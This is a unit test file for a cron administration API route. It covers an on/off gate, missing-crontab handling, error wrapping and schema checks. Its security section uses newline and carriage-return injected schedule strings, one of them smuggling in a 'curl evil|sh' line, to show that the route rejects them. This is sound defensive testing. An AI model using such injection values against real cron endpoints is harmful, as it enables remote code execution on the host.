/**
 * test/api-cron.test.ts - Unit tests for app/routes/api.cron.tsx.
 *
 * Covers:
 *   - Gate: on by default for any MC_USER; MC_CRON_ADMIN_ENABLED=0/false makes
 *     GET 404 and refuses every POST before the seam is reached.
 *   - Missing `crontab`: GET returns an empty list flagged crontabOk: false,
 *     POST is refused with a clear message and nothing is written.
 *   - A throwing seam comes back as { ok: false }, never a throw.
 *   - Schedule injection is still rejected end to end (route + real seam).
 *   - targetType flows through the create schema (ask-3).
 *
 * The REAL cron.server functions run, but always against in-memory fake deps:
 * the mock below re-binds each exported function to call the original with
 * FAKE, so no test can read or write the real crontab, the real ~/agents or a
 * real INBOX_ROOT, and crontabAvailable never looks at the real PATH.
 *
 * ASCII only - no em-dashes.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { CronDeps } from "~/lib/cron.server";

// vi.hoisted: vi.mock and the static imports below are hoisted above plain
// consts, so anything the mock factory touches must be hoisted with it.
const { writes, FAKE } = vi.hoisted(() => {
  const writes = { crontab: [] as string[], scripts: [] as string[] };
  const FAKE: CronDeps = {
    readCrontab: () => "",
    writeCrontab: (content) => {
      writes.crontab.push(content);
    },
    writeScript: (filePath) => {
      writes.scripts.push(filePath);
    },
    deleteScript: () => {},
    listAgentDirs: () => ["sprout"],
    readStateFile: () => null,
    writeStateFile: () => {},
    homedir: () => "/home/you",
    inboxRoot: () => "/srv/deck-test/inbox",
  };
  return { writes, FAKE };
});

vi.mock("~/lib/cron.server", async (importOriginal) => {
  const real = await importOriginal<typeof import("~/lib/cron.server")>();
  return {
    ...real,
    crontabAvailable: vi.fn((): boolean => true),
    listCrons: vi.fn(() => real.listCrons(FAKE)),
    createCron: vi.fn((p: Parameters<typeof real.createCron>[0]) => real.createCron(p, FAKE)),
    setEnabled: vi.fn((id: string, on: boolean) => real.setEnabled(id, on, FAKE)),
    deleteCron: vi.fn((id: string) => real.deleteCron(id, FAKE)),
  };
});

import { action, loader } from "~/routes/api.cron";
import * as cronServer from "~/lib/cron.server";

const seam = vi.mocked(cronServer);

const ORIGINAL_MC_USER = process.env["MC_USER"];
const ORIGINAL_CRON_ADMIN = process.env["MC_CRON_ADMIN_ENABLED"];

function restore(key: string, value: string | undefined): void {
  if (value === undefined) delete process.env[key];
  else process.env[key] = value;
}

beforeEach(() => {
  vi.clearAllMocks();
  seam.crontabAvailable.mockReturnValue(true);
  writes.crontab.length = 0;
  writes.scripts.length = 0;
  delete process.env["MC_USER"];
  delete process.env["MC_CRON_ADMIN_ENABLED"];
});

afterEach(() => {
  restore("MC_USER", ORIGINAL_MC_USER);
  restore("MC_CRON_ADMIN_ENABLED", ORIGINAL_CRON_ADMIN);
});

/** Build a fake Request with form-encoded body. */
function makeRequest(fields: Record<string, string>): Request {
  const body = new URLSearchParams(fields).toString();
  return new Request("http://localhost/api/cron", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  });
}

function runAction(fields: Record<string, string>) {
  return action({ request: makeRequest(fields), params: {}, context: {} } as unknown as Parameters<typeof action>[0]);
}

function runLoader() {
  return loader({
    request: new Request("http://localhost/api/cron"),
    params: {},
    context: {},
  } as unknown as Parameters<typeof loader>[0]);
}

const VALID_CREATE: Record<string, string> = {
  intent: "create",
  schedule: "30 7 * * *",
  target: "sprout",
  message: "morning check-in",
  enabled: "true",
};

function expectNothingWritten(): void {
  expect(writes.crontab).toEqual([]);
  expect(writes.scripts).toEqual([]);
}

// ---------------------------------------------------------------------------
// Gate
// ---------------------------------------------------------------------------

describe("api.cron - gate", () => {
  it("is on by default for any MC_USER: create reaches the seam and writes", async () => {
    process.env["MC_USER"] = "quill";

    const result = await runAction(VALID_CREATE);

    expect(result.ok).toBe(true);
    expect(writes.crontab).toHaveLength(1);
    expect(writes.crontab[0]).toContain("# MC-CRON:");
  });

  it("GET lists on by default", async () => {
    const data = await runLoader();
    expect(data).toEqual({ crons: [], crontabOk: true });
    expect(seam.listCrons).toHaveBeenCalledTimes(1);
  });

  for (const off of ["0", "false", "FALSE"]) {
    it(`GET 404s and reads nothing when MC_CRON_ADMIN_ENABLED=${off}`, async () => {
      process.env["MC_CRON_ADMIN_ENABLED"] = off;

      try {
        await runLoader();
        expect.unreachable("loader should have thrown");
      } catch (e) {
        expect(e).toBeInstanceOf(Response);
        expect((e as Response).status).toBe(404);
      }
      expect(seam.listCrons).not.toHaveBeenCalled();
    });
  }

  const intents: Array<Record<string, string>> = [
    VALID_CREATE,
    { intent: "setEnabled", id: "abc123", enabled: "false" },
    { intent: "delete", id: "abc123" },
  ];
  for (const fields of intents) {
    it(`refuses ${fields["intent"]} when opted out, before the seam`, async () => {
      process.env["MC_CRON_ADMIN_ENABLED"] = "0";

      const result = await runAction(fields);

      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toContain("not available on this instance");
      expect(seam.createCron).not.toHaveBeenCalled();
      expect(seam.setEnabled).not.toHaveBeenCalled();
      expect(seam.deleteCron).not.toHaveBeenCalled();
      expectNothingWritten();
    });
  }

  it("rejects unknown intent", async () => {
    const result = await runAction({ intent: "bogus" });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unknown intent");
  });
});

// ---------------------------------------------------------------------------
// Degradation
// ---------------------------------------------------------------------------

describe("api.cron - degradation", () => {
  it("GET reports a missing crontab without reading one", async () => {
    seam.crontabAvailable.mockReturnValue(false);

    const data = await runLoader();

    expect(data).toEqual({ crons: [], crontabOk: false });
    expect(seam.listCrons).not.toHaveBeenCalled();
  });

  it("POST is refused with a clear message when crontab is missing, and writes nothing", async () => {
    seam.crontabAvailable.mockReturnValue(false);

    const result = await runAction(VALID_CREATE);

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("crontab was not found");
    expect(seam.createCron).not.toHaveBeenCalled();
    expectNothingWritten();
  });

  it("turns a throwing seam into { ok: false } instead of a 500", async () => {
    seam.deleteCron.mockImplementationOnce(() => {
      throw new Error("crontab: write failed");
    });

    const result = await runAction({ intent: "delete", id: "abc123" });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("crontab: write failed");
  });
});

// ---------------------------------------------------------------------------
// Schedule injection defence at the api/cron boundary (SECURITY)
// ---------------------------------------------------------------------------

describe("api.cron action - schedule injection defence", () => {
  it("rejects a newline-injection schedule and writes nothing", async () => {
    // Embedded newline turns one valid cron line into two when interpolated
    // into the crontab. The real seam runs here (against fake deps), so this
    // proves the route plus seam reject it end to end.
    const result = await runAction({
      ...VALID_CREATE,
      schedule: "* * * * *\n* * * * * curl evil|sh # MC-CRON:x",
    });

    expect(result.ok).toBe(false);
    expectNothingWritten();
  });

  it("rejects a carriage-return-injection schedule and writes nothing", async () => {
    const result = await runAction({ ...VALID_CREATE, schedule: "30 7 * * *\r* * * * * evil" });

    expect(result.ok).toBe(false);
    expectNothingWritten();
  });
});

// ---------------------------------------------------------------------------
// targetType field flows through create schema (ask-3)
// ---------------------------------------------------------------------------

describe("api.cron action - targetType field", () => {
  it("passes targetType=agent through to the seam", async () => {
    const result = await runAction({ ...VALID_CREATE, targetType: "agent" });

    expect(result.ok).toBe(true);
    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "agent" });
  });

  it("passes targetType=script through to the seam", async () => {
    const result = await runAction({
      ...VALID_CREATE,
      schedule: "*/30 * * * *",
      message: "#!/usr/bin/env bash\necho hi",
      targetType: "script",
    });

    expect(result.ok).toBe(true);
    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "script" });
  });

  it("defaults targetType to agent when not provided", async () => {
    const result = await runAction(VALID_CREATE);

    expect(result.ok).toBe(true);
    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "agent" });
  });

  it("rejects an invalid targetType value at schema level", async () => {
    const result = await runAction({ ...VALID_CREATE, targetType: "tmux" });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Invalid create payload");
    expect(seam.createCron).not.toHaveBeenCalled();
  });

  it("rejects an unknown target agent at the seam, after the schema", async () => {
    const result = await runAction({ ...VALID_CREATE, target: "nonexistent-agent-xyz" });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).not.toContain("Invalid create payload");
      expect(result.error).toContain("Unknown target agent");
    }
    expectNothingWritten();
  });
});
